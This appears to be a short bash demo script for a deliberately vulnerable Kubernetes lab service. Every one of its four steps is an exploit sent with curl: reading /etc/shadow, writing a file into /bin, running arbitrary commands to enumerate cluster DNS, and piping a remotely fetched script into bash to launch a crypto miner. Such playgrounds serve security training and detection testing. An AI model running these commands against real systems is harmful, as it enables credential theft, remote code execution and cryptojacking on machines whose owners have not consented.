#!/bin/bash
# Script to demonstrate how to interact with security-playground

NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')

echo "1. Exploit reading our /etc/shadow file and sending it back to us"
curl $NODE_IP:30284/etc/shadow

echo "2. Exploit writing \"hello-world\" to /bin/hello within our container"
curl -X POST $NODE_IP:30284/bin/hello -d 'content=hello-world'
echo ""
echo "and then read it back remotely"
curl $NODE_IP:30284/bin/hello
echo ""

echo "3. Exploit installing dnsutils and doing a dig against k8s DNS"
curl -X POST $NODE_IP:30284/exec -d 'command=apt-get update; apt-get -y install dnsutils;/usr/bin/dig srv any.any.svc.cluster.local'

echo "4. Exploit running a script to run a crypto miner"
curl -X POST $NODE_IP:30284/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'